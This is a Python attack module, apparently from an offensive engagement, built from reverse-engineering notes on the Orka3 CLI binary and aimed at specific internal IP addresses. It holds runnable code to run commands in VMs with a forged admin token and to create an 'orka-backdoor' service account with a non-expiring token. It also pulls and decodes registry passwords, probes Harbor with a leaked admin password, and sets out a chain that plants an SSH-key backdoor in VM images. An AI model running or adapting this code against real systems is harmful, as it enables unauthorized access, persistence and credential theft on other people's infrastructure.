"""
orka_vm_exec_re.py — Orka3 VM execution + SA token persistence attack module.

Reconstructed from: /home/cowboy/VDT/tools/orka3/orka3 (77MB Go ELF, go1.25.7)

=== vmiexec package (macstadium.com/orka-go/pkg/vmiexec) ===
The vmiexec package implements virsh command execution on Orka hypervisor nodes.

Symbols extracted:
  vmiexec.ExecuteVirshCommand      — execute virsh (KVM management) on hypervisor
  vmiexec.executor                 — executor struct
  vmiexec.(*executor).Exec         — send exec request via K8s pod exec API
  vmiexec.(*executor).getExecRequestURL — CONFIRMED: builds K8s pod exec URL
                                         .Resource("pods").Name(pod_name)
                                         .SubResource("exec")
                                         container param = "orka-vm"
                                         Full path: /api/v1/namespaces/{ns}/pods/{pod}/exec
                                         ?container=orka-vm&command=...
                                         (WebSocket/SPDY upgrade required)
  vmiexec.vmActions                — map[VMCommand]vmCommandDescriptor
                                     VMCommand is a STRING type (not iota int)
                                     Confirmed keys from map.init.0 + success string pool:
                                       "start" "stop" "revert" "resume" "suspend" (all 5 confirmed)
  vmiexec.vmCommandDescriptor      — per-command metadata (virsh state + messages)
  vmiexec.vmState                  — VM state machine (running/stopped/etc)
  vmiexec.NewExecutor              — executor factory
                                     Signature (confirmed from disassembly):
                                       func NewExecutor(config *rest.Config,
                                                        namespace string,
                                                        podName string) (Executor, error)
                                     Calls: k8s.io/client-go/kubernetes.NewForConfig
                                     Returns wrapped in go:itab.*executor,Executor @ 0x271aac0

=== executor struct layout (confirmed from NewExecutor field stores) ===
  [0x00]  *rest.Config           ← GetConfigOrDie() return
  [0x08]  namespace.ptr          ← NewExecutor arg: namespace string ptr
  [0x10]  namespace.len          ← NewExecutor arg: namespace string len
  [0x18]  podName.ptr            ← NewExecutor arg: podName string ptr
  [0x20]  podName.len            ← NewExecutor arg: podName string len
  [0x28]  *kubernetes.Clientset  ← NewForConfig(config) return

=== VM name → K8s pod name mapping (CONFIRMED: identity) ===
  CLI: orka3 vm suspend <vm-name>
  Cobra closure: newVmSuspendCommand.func12
  → args[0] (vm-name string) used verbatim as podName
  → defaultExecutorFn(namespace, podName) via global fn ptr
  → NewExecutor(config, "orka-default", vm-name)
  → getExecRequestURL builds: /api/v1/namespaces/orka-default/pods/<vm-name>/exec?container=orka-vm

  NO mapping, NO label selector, NO transformation.
  Orka VM name == K8s pod name, one-to-one, namespace defaults to "orka-default".
  --namespace flag overrides the namespace.

=== getExecRequestURL CALL chain (confirmed from disassembly @ 0x1c71700) ===
  Call chain (RIP-relative CALLs resolved):
    .(*CoreV1Client).RESTClient @ 0x15c8280
    .(*Request).Namespace(executor[0x08/0x10])  — "orka-default" by default
    .(*Request).Resource("pods")                 — literal "pods" @ 0x21de872
    .(*Request).Name(executor[0x18/0x20])        — vm-name verbatim
    .(*Request).SubResource("exec")              — literal "exec" @ 0x21de816
    runtime.newobject (allocates PodExecOptions)
    store "orka-vm" @ opts[0x28] len=7 @ [0x30]  — hardcoded container
    .(*Request).SpecificallyVersionedParams(opts) @ 0x1127d80
    .(*Request).URL() @ 0x1128960

=== (*executor).Exec call chain (CONFIRMED from disassembly @ 0x1c711c0) ===
  1. (*CoreV1Client).Pods(namespace).Get(ctx, podName, GetOptions{})
       → if IsNotFound: return fmt.Errorf("pod not found: %s", podName)
  2. getExecRequestURL(self, commands []string) -> *url.URL
  3. remotecommand.NewSPDYExecutor(config, "POST", url) -> Executor
       NewSPDYExecutor @ 0x170bc80; method literal "POST" @ 0x21de7a2
  4. executor.Stream(StreamOptions{Stdout: &strings.Builder{}, Stderr: &strings.Builder{}})
  5. Result string assembled via runtime.concatstring2 + strings.Join:
       "stdOut: " + stdout   (literal @ 0x21e6085)
       "stdErr: " + stderr   (literal @ 0x21e608d)
       strings.Join(parts, "; ")  (separator @ 0x21ddc0d)
  6. Return: "stdOut: <stdout>; stdErr: <stderr>", nil

  PodExecOptions heap layout (runtime.newobject + field stores):
    +0x21: Stdout = true  (movb $0x1)
    +0x22: Stderr = true  (movw $0x1)
    +0x28: Container ptr  -> "orka-vm" @ 0x21e374b
    +0x30: Container len  = 7 (movq $0x7)
    +0x38: Command []string <- commands arg
    +0x40/0x48: namespace from executor struct

=== ExecuteVirshCommand pre-check (CONFIRMED from disassembly) ===
  Before sending any virsh command, ExecuteVirshCommand FIRST checks domain state with:
    virsh status macos
  The string "status" (6 bytes) at vaddr 0x21e0dac is the pre-check subcommand.
  Confirmed: python3 -c "open('/path/orka3','rb').seek(0x21e0dac - 0x400000) or
             open('/path/orka3','rb').read(6)" -> b'status'

  Flow:
    1. ExecuteVirshCommand called with command key (e.g. "start")
    2. Look up vmCommandDescriptor for key -> get virshState (required pre-state)
    3. K8s exec "virsh status macos" in orka-vm container
    4. stringslite.Index(stdout, virshState) — check domain is in required state
       If not: return error "VM is already <state>"
    5. If state matches: K8s exec "virsh <virshCmd> macos"
    6. stringslite.Index(stdout, successMsg) — verify command succeeded

  Purpose: prevent idempotent state errors (e.g. "start" on already-running VM
  would cause libvirt error; the pre-check catches this cleanly).

=== Virsh command assembly (PENDING) ===
  "virsh" does NOT appear as a standalone string literal in the orka3 binary.
  Hypothesis: the orka-vm container has a wrapper script/binary that accepts
  the command name (start/destroy/resume/suspend) and constructs the virsh invocation,
  OR the virsh args are assembled at runtime from per-character constants.
  Investigation: inspect orka-vm container image layers (via Harbor at 10.221.188.5:30080).

=== VMCommand map (extracted from map.init.0 @ 0x1c707a0) ===
All 5 keys CONFIRMED via map.init.0 disassembly + success string pool extraction:

  Key         virshCmd     virshState  successMsg               errorMsg
  "start"     start        shut off    "Domain macos started"   "VM is already running"
  "stop"      destroy      running     "Domain macos destroyed" "VM is already stopped"
  "revert"    (dynamic)    running     "VM has been reverted"   "VM is already running"
  "resume"    resume       paused      "Domain macos resumed"   —
  "suspend"   suspend      running     "VM has been suspended"  —

  NOTE: "revert" does NOT use snapshot-revert literal — "snapshot-revert" absent from binary.
        success string "VM has been reverted" (Orka-layer message, not raw libvirt output)
        virsh snapshot name is likely passed dynamically or uses current snapshot.
  NOTE: "suspend" success = "VM has been suspended" (0x21fe604), NOT "Domain macos suspended".
        "Domain macos suspended" (0x21fff55) is the raw libvirt output; Orka wraps it.

  virsh domain name: "macos"  (literal in success strings)
  K8s container name: "orka-vm"  (PodExecOptions.Container, confirmed via LEA)

=== virsh binary path (CONFIRMED ABSENT from .rodata) ===
  String "virsh" appears ONCE in the entire binary:
    vaddr 0x1cf6d20 → "virshStatus" (K8s type reflection label, NOT a command path)
  "/usr/local/bin/virsh", "/usr/bin/virsh", "virsh\x00", "virsh " — ALL ABSENT.
  Conclusion: virsh executable path is constructed at runtime by vmiexec internals,
  not stored as a string constant. vmiexec likely uses a configurable path or
  discovers virsh via PATH inside the orka-vm container.
  Binary at 0x21ff43a (context of /usr/local/bin): "/usr/local/bin/python" and
  "/usr/bin/env -S tclsh" — these are unrelated script interpreter paths.

=== Exec mechanism (CONFIRMED) ===
  NOT: /api/v1/namespaces/{ns}/vms/{name}/exec (Orka API)
  YES: /api/v1/namespaces/{ns}/pods/{pod}/exec?container=orka-vm (K8s API)
       with K8s SPDY/WebSocket exec protocol
       → kubectl exec {pod} -c orka-vm -n {ns} -- virsh {command} macos

=== Intel-only suspend ===
  pushbytes endpoint: /api/v1/namespaces/{ns}/vms/{name}/pushbytes (Orka API)
  Description in binary: "(Intel-only) Suspend a running VM"
  Separate from the virsh-based stop/resume flow above.

=== serviceaccount package ===
  serviceaccount.createServiceAccountToken   — request K8s SA token
  serviceaccount.createTokenWithNoExpiration — request SA token with no TTL (!!)
  serviceaccount.createServiceAccount        — create new SA
  serviceaccount.deleteServiceAccount        — delete SA

=== registrycredential package ===
  registrycredential.addCredentials    — store Docker registry credentials in Orka
  registrycredential.listServers       — list configured registry servers
  registrycredential.removeCredentials — remove stored credentials
  orka-go/pkg/regcred.AuthConfig       — Docker auth config struct
  orka-go/pkg/regcred.(*AuthConfig).Encode — base64 Docker auth encoding
  Field: Insecure json:"insecure,omitempty"

=== VM management commands ===
  vm.deployVM          — deploy a new VM from config
  vm.createVM          — create VM config
  vm.deleteVm          — delete VM
  vm.executeCommand    — execute command in VM (via vmiexec)
  vm.commitImage       — commit VM image changes
  vm.saveImage         — save VM image state
  vm.resizeImage       — resize VM disk image
  vm.vmPush            — push VM image to registry
  vm.nameVM            — assign name to VM
  vm.waitForVM         — poll until VM reaches target state
  vm.validateCredentials — validate auth before VM operations

=== vm_config package ===
  vm_config.createVmConfig — create VirtualMachineConfig CRD
  vm_config.deleteVmConfig — delete VirtualMachineConfig CRD
  Field: vmcCreateExample  — help text with example config (exposes schema)

=== Attack Chains ===

=== vm.executeCommand call chain (CONFIRMED from disassembly) ===
vm.executeCommand @ 0x1c76b20 (277 bytes):
  1. call defaultExecutorFn @ 0x1c76a80 (indirect via global fn ptr @ 0x38c15a8)
       defaultExecutorFn:
         a. controller-runtime/config.GetConfigOrDie @ 0x17d47c0
            → loads K8s client config (KUBECONFIG env or in-cluster SA token)
         b. vmiexec.NewExecutor @ 0x1c71060
            → creates executor with K8s client targeting orka-vm container
  2. if executor ok: call vmiexec.ExecuteVirshCommand @ 0x1c70c80
       → SPDY/WebSocket exec to /api/v1/namespaces/{ns}/pods/{pod}/exec?container=orka-vm
       → NO ORKA REST API CALL — pure K8s exec path

SECURITY IMPLICATION:
  Orka CLI (orka3) has a DIRECT K8s exec mode — bypasses Orka REST API entirely.
  If you have a K8s credential (kubeconfig or SA token), orka3 can:
    - Send VM commands directly to K8s without Orka API auth
    - No Orka-layer audit trail for virsh commands
  Attack path: forge JWT → steal SA token (no-expiry) → use SA token as kubeconfig
                → orka3 VM commands bypass Orka auth entirely

Chain A — VM RCE via vmiexec (internal access required):
  1. Forge admin JWT (orka_oidc_re.forge_admin_token)
  2. GET /api/v1/cluster-info → base_oauth_endpoint
  3. GET /api/v1/namespaces/orka-default/vms → enumerate VMs
  4. POST /api/v1/namespaces/{ns}/vms/{name}/exec
     body: {"command": "virsh list --all"} → hypervisor shell
  5. virsh domifaddr <vmname> → get VM IP
  6. virsh console <vmname> → macOS VM shell

Chain A (confirmed exec path — direct K8s, no Orka API):
  kubectl exec {orka-vm-pod} -c orka-vm -n orka-default \
    -- virsh list --all
  → shows "macos" domain on hypervisor node

Chain B — SA token persistence (K8s cluster):
  1. Forge admin JWT
  2. POST /api/v1/namespaces/orka-default/serviceaccounts → create new SA
  3. POST /api/v1/namespaces/orka-default/serviceaccounts/<new-sa>/token
     body: {expirationSeconds: null} → NO EXPIRY token
  4. Token saved as new K8s credential → permanent cluster access

Chain C — Registry credential extraction:
  1. Forge admin JWT
  2. GET /api/v1/namespaces/orka-default/registrycredentials → list
  3. Response contains Docker auths (base64 user:pass) for all configured registries
  4. Pull any internal macOS VM image → extract image layers → find secrets

Chain D — VM image backdoor:
  1. Forge admin JWT
  2. Harbor registry at 10.221.188.5:30080 — admin:p@ssw0rd
  3. Docker pull internal VM base image
  4. Add backdoor layer (SSH key, reverse shell)
  5. Docker push → overwrite image in Harbor
  6. vm.deployVM with modified image → backdoored macOS VM

=== K8s SA Token Request API ===
URL: /api/v1/namespaces/{ns}/serviceaccounts/{sa}/token
Method: POST
Body:
{
  "apiVersion": "authentication.k8s.io/v1",
  "kind": "TokenRequest",
  "spec": {
    "audiences": [],
    "expirationSeconds": null   # null = no expiry (createTokenWithNoExpiration)
  }
}
"""

import base64
import json
import ssl
import urllib.error
import urllib.parse
import urllib.request
from typing import Optional

# ── Constants (fill locally from orka3 binary + kubeconfig) ────────────────

ORKA_API_BASE    = 'http://10.221.188.20'
ORKA_API_OLD     = 'http://10.221.188.100'
K8S_API          = 'https://10.221.188.19:6443'
HARBOR_HOST      = 'http://10.221.188.5:30080'
HARBOR_USER      = 'admin'
HARBOR_PASS      = 'FILL_IN_LOCALLY'  # from binary help text

ORKA_DEFAULT_NS  = 'orka-default'

# Confirmed from binary (getExecRequestURL disassembly + PodExecOptions.Container field)
ORKA_VM_CONTAINER = 'orka-vm'

# Confirmed from map.init.0 success strings ("Domain macos started", "Domain macos destroyed")
VIRSH_DOMAIN = 'macos'

# Pre-check subcommand: ExecuteVirshCommand calls "virsh status macos" FIRST to gate
# the actual command on domain state. String at vaddr 0x21e0dac (file offset 0x1de0dac).
# Confirmed: python3 read of raw binary bytes at that offset returns b'status'.
VIRSH_PRECHECK_CMD = 'status'

# ExecuteVirshCommand two-phase exec flow (confirmed from disassembly):
VIRSH_EXEC_FLOW = {
    'phase_1': {
        'cmd':  ['virsh', VIRSH_PRECHECK_CMD, VIRSH_DOMAIN],
        'desc': 'Read domain state via virsh status; check against vmCommandDescriptor.virshState',
        'gate': 'If stdout does not contain required virshState -> return error, abort',
    },
    'phase_2': {
        'cmd':  ['virsh', '<virshCmd>', VIRSH_DOMAIN],
        'desc': 'Execute actual virsh command (start/destroy/resume/suspend)',
        'gate': 'If stdout does not contain successMsg -> return error',
    },
    'state_check_fn': 'stringslite.Index',
    'success_check_fn': 'stringslite.Index',
}

# VMCommand string keys — ALL 5 CONFIRMED from map.init.0 + success string pool:
#   0x21fc7e1 "Domain macos started"   — start success (virsh start macos raw output)
#   0x21fff3f "Domain macos destroyed" — stop success (virsh destroy macos raw output)
#   0x21fc7f5 "VM has been reverted"   — revert success (Orka-layer; snapshot-revert absent from binary)
#   0x21fc809 "Domain macos resumed"   — resume success (virsh resume macos raw output)
#   0x21fe604 "VM has been suspended"  — suspend success (Orka-layer; 0x21fff55=raw libvirt output)
VM_COMMANDS = {
    'start':   {'virsh_state': 'shut off', 'virsh_cmd': 'start',   'success': 'Domain macos started',   'error': 'VM is already running'},
    'stop':    {'virsh_state': 'running',  'virsh_cmd': 'destroy',  'success': 'Domain macos destroyed', 'error': 'VM is already stopped'},
    'revert':  {'virsh_state': 'running',  'virsh_cmd': None,       'success': 'VM has been reverted',   'error': 'VM is already running'},
    'resume':  {'virsh_state': 'paused',   'virsh_cmd': 'resume',   'success': 'Domain macos resumed',   'error': None},
    'suspend': {'virsh_state': 'running',  'virsh_cmd': 'suspend',  'success': 'VM has been suspended',  'error': None},
}

# VM state strings used in vmCommandDescriptor.virshState (virsh domstate output values)
VM_STATES = {'running', 'shut off', 'paused'}

# Fill locally from orka_oidc_re.forge_admin_token()
ADMIN_TOKEN      = 'FILL_IN_LOCALLY'

# ── API Route Map (extracted from orka3 binary) ──────────────────────────────

ROUTES = {
    'cluster_info':         '/api/v1/cluster-info',
    'vms':                  '/api/v1/namespaces/{ns}/vms',
    'vm_detail':            '/api/v1/namespaces/{ns}/vms/{name}',
    'vm_exec':              '/api/v1/namespaces/{ns}/vms/{name}/exec',
    'vm_push_status':       '/api/v1/namespaces/{ns}/vms/{name}/pushbytes',
    'sa_list':              '/api/v1/namespaces/{ns}/serviceaccounts',
    'sa_token':             '/api/v1/namespaces/{ns}/serviceaccounts/{sa}/token',
    'regcreds':             '/api/v1/namespaces/{ns}/registrycredentials',
    'images':               '/api/v1/namespaces/{ns}/images',
    'isos':                 '/api/v1/namespaces/{ns}/isos',
    'nodes':                '/api/v1/nodes',
    'vm_configs':           '/api/v1/namespaces/{ns}/vmconfigs',
}


def _http(method: str, url: str, token: Optional[str] = None,
          body: Optional[dict] = None, timeout: int = 8) -> dict:
    """Generic HTTP helper for Orka/K8s API calls."""
    headers = {'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token:
        headers['Authorization'] = f'Bearer {token}'

    data = json.dumps(body).encode() if body else None
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    result = {'url': url, 'status': None, 'body': None, 'error': None}
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            result['status'] = r.status
            raw = r.read().decode('utf-8', errors='replace')
            result['body_raw'] = raw[:8192]
            try:
                result['body'] = json.loads(raw)
            except json.JSONDecodeError:
                result['body'] = raw[:2048]
    except urllib.error.HTTPError as e:
        result['status'] = e.code
        try: result['error'] = e.read().decode('utf-8', errors='replace')[:500]
        except: result['error'] = str(e)
    except Exception as e:
        result['error'] = str(e)[:200]
    return result


def _orka_url(route_key: str, ns: str = ORKA_DEFAULT_NS,
              name: str = '', sa: str = '',
              api_base: str = ORKA_API_BASE) -> str:
    path = ROUTES[route_key].format(ns=ns, name=name, sa=sa)
    return api_base + path


# ── Chain A: VM Enumeration + Exec ─────────────────────────────────────────

def list_vms(token: str = ADMIN_TOKEN,
             ns: str = ORKA_DEFAULT_NS,
             api_base: str = ORKA_API_BASE) -> dict:
    """
    GET /api/v1/namespaces/{ns}/vms
    Requires admin JWT. Returns all running VMs in namespace.
    """
    url = _orka_url('vms', ns=ns, api_base=api_base)
    return _http('GET', url, token=token)


def exec_vm_command(vm_name: str, command: list,
                    token: str = ADMIN_TOKEN,
                    ns: str = ORKA_DEFAULT_NS,
                    api_base: str = ORKA_API_BASE) -> dict:
    """
    POST /api/v1/namespaces/{ns}/vms/{name}/exec
    Executes command in VM via vmiexec.Exec / ExecuteVirshCommand.
    command: list of strings, e.g. ['virsh', 'list', '--all']
    """
    url = _orka_url('vm_exec', ns=ns, name=vm_name, api_base=api_base)
    body = {'command': command}
    return _http('POST', url, token=token, body=body)


def exec_virsh_list(token: str = ADMIN_TOKEN, ns: str = ORKA_DEFAULT_NS,
                    api_base: str = ORKA_API_BASE) -> dict:
    """virsh list --all via vmiexec.ExecuteVirshCommand."""
    return exec_vm_command('', ['virsh', 'list', '--all'], token, ns, api_base)


def probe_vm_exec_surface(token: str = ADMIN_TOKEN, ns: str = ORKA_DEFAULT_NS,
                           api_base: str = ORKA_API_BASE) -> dict:
    """
    Full Chain A:
    1. List all VMs
    2. For each running VM, attempt exec with id + hostname commands
    """
    result = {'vms': [], 'exec_results': []}

    list_r = list_vms(token, ns, api_base)
    result['list_response'] = list_r

    if list_r.get('body') and isinstance(list_r['body'], (dict, list)):
        items = list_r['body'] if isinstance(list_r['body'], list) else \
                list_r['body'].get('items', [])
        for item in items[:10]:
            vm_name = item.get('metadata', {}).get('name', '') or item.get('name', '')
            if not vm_name:
                continue
            result['vms'].append(vm_name)
            for cmd in [['id'], ['hostname'], ['uname', '-a'], ['ls', '/Users']]:
                r = exec_vm_command(vm_name, cmd, token, ns, api_base)
                result['exec_results'].append({
                    'vm': vm_name,
                    'cmd': cmd,
                    'status': r.get('status'),
                    'output': str(r.get('body', ''))[:500],
                })

    return result


# ── Chain A (confirmed): K8s pod exec via orka-vm container ─────────────────

def build_k8s_exec_cmd(pod_name: str,
                        command: list,
                        ns: str = ORKA_DEFAULT_NS,
                        container: str = ORKA_VM_CONTAINER,
                        kubeconfig: str = '~/.kube/config') -> str:
    """
    Build kubectl exec command string targeting the orka-vm container.

    Confirmed exec path from getExecRequestURL disassembly:
      K8s REST: .Resource("pods").Name(pod).SubResource("exec")
      container param = "orka-vm" (PodExecOptions.Container)
      Uses SPDY/WebSocket — kubectl handles the upgrade transparently.

    Example for virsh:
      kubectl exec {pod} -c orka-vm -n orka-default -- virsh list --all
      → shows "macos" domain on the hypervisor
    """
    cmd_parts = ['kubectl', '--kubeconfig', kubeconfig,
                 'exec', pod_name,
                 '-c', container,
                 '-n', ns,
                 '--']
    cmd_parts.extend(command)
    return ' '.join(cmd_parts)


def exec_virsh_via_kubectl(pod_name: str,
                            virsh_args: list,
                            ns: str = ORKA_DEFAULT_NS,
                            kubeconfig: str = '~/.kube/config') -> dict:
    """
    Execute virsh command inside orka-vm container via kubectl exec.
    Requires kubeconfig with sufficient RBAC (pods/exec in ns).

    Example: exec_virsh_via_kubectl('orka-vm-abc123', ['list', '--all'])
    → runs: kubectl exec orka-vm-abc123 -c orka-vm -n orka-default -- virsh list --all
    """
    import subprocess
    command = ['virsh'] + virsh_args
    kubectl_cmd = ['kubectl', '--kubeconfig', kubeconfig,
                   'exec', pod_name,
                   '-c', ORKA_VM_CONTAINER,
                   '-n', ns,
                   '--'] + command
    result = {'pod': pod_name, 'command': command, 'kubectl_cmd': ' '.join(kubectl_cmd)}
    try:
        proc = subprocess.run(kubectl_cmd, capture_output=True, text=True, timeout=15)
        result['stdout'] = proc.stdout[:4096]
        result['stderr'] = proc.stderr[:512]
        result['returncode'] = proc.returncode
    except subprocess.TimeoutExpired:
        result['error'] = 'timeout'
    except Exception as e:
        result['error'] = str(e)[:200]
    return result


def build_virsh_chain(pod_name: str,
                       ns: str = ORKA_DEFAULT_NS,
                       kubeconfig: str = '~/.kube/config') -> dict:
    """
    Execute the full virsh chain against orka-vm container:
      virsh list --all           → enumerate VMs (expect "macos" domain)
      virsh domstate macos       → get current state
      virsh domifaddr macos      → get VM IP on hypervisor bridge
      virsh dumpxml macos | grep -E '(mac|source)' → network config
    """
    results = {}
    virsh_probes = [
        ('list_all',   ['list', '--all']),
        ('domstate',   ['domstate', VIRSH_DOMAIN]),
        ('domifaddr',  ['domifaddr', VIRSH_DOMAIN]),
        ('domid',      ['domid', VIRSH_DOMAIN]),
        ('vcpuinfo',   ['vcpuinfo', VIRSH_DOMAIN]),
    ]
    for key, args in virsh_probes:
        results[key] = exec_virsh_via_kubectl(pod_name, args, ns, kubeconfig)
    return results


# ── Chain B: SA Token Persistence ──────────────────────────────────────────

def create_service_account_token(sa_name: str,
                                  token: str = ADMIN_TOKEN,
                                  ns: str = ORKA_DEFAULT_NS,
                                  no_expiry: bool = True,
                                  k8s_base: str = K8S_API) -> dict:
    """
    POST /api/v1/namespaces/{ns}/serviceaccounts/{sa}/token
    Mirrors orka3 createServiceAccountToken / createTokenWithNoExpiration.
    no_expiry=True → expirationSeconds: null → permanent token
    """
    url = k8s_base + ROUTES['sa_token'].format(ns=ns, sa=sa_name)
    body = {
        'apiVersion': 'authentication.k8s.io/v1',
        'kind': 'TokenRequest',
        'spec': {
            'audiences': [],
            'expirationSeconds': None if no_expiry else 86400,
        },
    }
    return _http('POST', url, token=token, body=body)


def create_persistent_sa(sa_name: str = 'orka-backdoor',
                          token: str = ADMIN_TOKEN,
                          ns: str = ORKA_DEFAULT_NS,
                          k8s_base: str = K8S_API) -> dict:
    """
    Create a new K8s service account + request a non-expiring token.
    Full SA persistence chain.
    """
    url = k8s_base + ROUTES['sa_list'].format(ns=ns)
    sa_body = {
        'apiVersion': 'v1',
        'kind': 'ServiceAccount',
        'metadata': {'name': sa_name, 'namespace': ns},
    }
    create_r = _http('POST', url, token=token, body=sa_body)
    token_r = create_service_account_token(sa_name, token, ns, True, k8s_base)
    return {
        'sa_create': create_r,
        'token_request': token_r,
        'persistent_token': token_r.get('body', {}).get('status', {}).get('token'),
    }


# ── Chain C: Registry Credential Extraction ────────────────────────────────

def list_registry_credentials(token: str = ADMIN_TOKEN,
                                ns: str = ORKA_DEFAULT_NS,
                                api_base: str = ORKA_API_BASE) -> dict:
    """
    GET /api/v1/namespaces/{ns}/registrycredentials
    Returns Docker auth configs for all configured registries.
    orka-go/pkg/regcred.AuthConfig → base64 user:pass
    """
    url = _orka_url('regcreds', ns=ns, api_base=api_base)
    r = _http('GET', url, token=token)

    # Decode any base64 auth fields found
    decoded = []
    body = r.get('body')
    if isinstance(body, (list, dict)):
        items = body if isinstance(body, list) else body.get('items', [body])
        for item in items:
            auths = item.get('spec', {}).get('auths', {}) or item.get('auths', {})
            for server, auth_data in auths.items():
                if isinstance(auth_data, dict) and 'auth' in auth_data:
                    try:
                        decoded_auth = base64.b64decode(auth_data['auth']).decode()
                        user, password = decoded_auth.split(':', 1)
                        decoded.append({
                            'server': server,
                            'user': user,
                            'password': password,
                        })
                    except Exception:
                        decoded.append({'server': server, 'raw_auth': auth_data['auth']})

    r['decoded_credentials'] = decoded
    return r


def probe_harbor_api(token: str = ADMIN_TOKEN,
                     harbor_base: str = HARBOR_HOST) -> dict:
    """
    Probe Harbor registry API with admin creds.
    Lists projects, repositories, and artifacts (VM images).
    Fill HARBOR_PASS locally (extracted from orka3 binary help text).
    """
    results = {}
    creds = base64.b64encode(f'{HARBOR_USER}:{HARBOR_PASS}'.encode()).decode()
    auth_header = f'Basic {creds}'

    for path, key in [
        ('/api/v2.0/projects', 'projects'),
        ('/api/v2.0/repositories', 'repositories'),
        ('/api/v2.0/users', 'users'),
        ('/api/v2.0/systeminfo', 'systeminfo'),
    ]:
        url = harbor_base + path
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            req = urllib.request.Request(
                url,
                headers={'Authorization': auth_header, 'Accept': 'application/json'},
            )
            with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                results[key] = {'status': r.status, 'body': json.loads(body) if body else {}}
        except urllib.error.HTTPError as e:
            results[key] = {'status': e.code, 'error': str(e)}
        except Exception as e:
            results[key] = {'error': str(e)[:100]}

    return results


# ── Chain D: VM Image Backdoor (documentation only) ───────────────────────

BACKDOOR_CHAIN_DOC = """
Chain D — VM Image Backdoor (requires Docker + VPN + HARBOR_PASS)

Prerequisites:
  - Harbor at http://10.221.188.5:30080 reachable
  - Harbor credentials: admin:FILL_IN_LOCALLY (from orka3 binary)
  - Docker installed locally

Steps:
  1. docker login http://10.221.188.5:30080 -u admin -p HARBOR_PASS
  2. docker pull 10.221.188.5:30080/<project>/<base-image>
  3. Create backdoor Dockerfile:
       FROM 10.221.188.5:30080/<project>/<base-image>
       RUN echo '<authorized_key>' >> /Users/admin/.ssh/authorized_keys
  4. docker build -t 10.221.188.5:30080/<project>/<base-image>:backdoor .
  5. docker push 10.221.188.5:30080/<project>/<base-image>:backdoor
  6. orka3 vm deploy --vm-config <config> --image <base-image>:backdoor
     → deploys macOS VM with SSH key backdoor

Result: persistent SSH access to macOS VM on MacStadium hardware.
"""


# ── Enumeration Suite ───────────────────────────────────────────────────────

def probe_api_surface(token: str = ADMIN_TOKEN,
                      ns: str = ORKA_DEFAULT_NS,
                      api_base: str = ORKA_API_BASE) -> dict:
    """Enumerate all Orka API endpoints with admin token."""
    results = {}
    probe_routes = {
        'cluster_info': '/api/v1/cluster-info',
        'vms': f'/api/v1/namespaces/{ns}/vms',
        'vm_configs': f'/api/v1/namespaces/{ns}/vmconfigs',
        'images': f'/api/v1/namespaces/{ns}/images',
        'isos': f'/api/v1/namespaces/{ns}/isos',
        'nodes': '/api/v1/nodes',
        'regcreds': f'/api/v1/namespaces/{ns}/registrycredentials',
        'serviceaccounts': f'/api/v1/namespaces/{ns}/serviceaccounts',
    }
    for key, path in probe_routes.items():
        url = api_base + path
        results[key] = _http('GET', url, token=token)
    return results


def run_full_attack_chain(token: str = ADMIN_TOKEN,
                           api_base: str = ORKA_API_BASE,
                           k8s_base: str = K8S_API) -> dict:
    """
    Full attack chain:
      A: VM enumeration + exec probe
      B: SA token persistence
      C: Registry credential extraction
    Requires VPN access to 10.221.188.x subnet.
    Fill token locally from orka_oidc_re.forge_admin_token().
    """
    print('[orka_vm_exec_re] Chain A: API surface enum...')
    api_surface = probe_api_surface(token, api_base=api_base)

    print('[orka_vm_exec_re] Chain A: VM exec probe...')
    vm_exec = probe_vm_exec_surface(token, api_base=api_base)

    print('[orka_vm_exec_re] Chain B: SA token persistence...')
    sa_token = create_service_account_token('default', token, k8s_base=k8s_base)

    print('[orka_vm_exec_re] Chain C: Registry credential extraction...')
    regcreds = list_registry_credentials(token, api_base=api_base)

    return {
        'api_surface': api_surface,
        'vm_exec': vm_exec,
        'sa_token_persistence': sa_token,
        'registry_credentials': regcreds,
        'backdoor_chain_doc': BACKDOOR_CHAIN_DOC,
    }


if __name__ == '__main__':
    import sys
    if '--api' in sys.argv:
        print(json.dumps(probe_api_surface(), indent=2, default=str))
    elif '--vms' in sys.argv:
        print(json.dumps(list_vms(), indent=2, default=str))
    elif '--sa-token' in sys.argv:
        print(json.dumps(create_service_account_token('default'), indent=2, default=str))
    elif '--regcreds' in sys.argv:
        print(json.dumps(list_registry_credentials(), indent=2, default=str))
    elif '--harbor' in sys.argv:
        print(json.dumps(probe_harbor_api(), indent=2, default=str))
    elif '--backdoor-doc' in sys.argv:
        print(BACKDOOR_CHAIN_DOC)
    else:
        print(json.dumps(run_full_attack_chain(), indent=2, default=str))
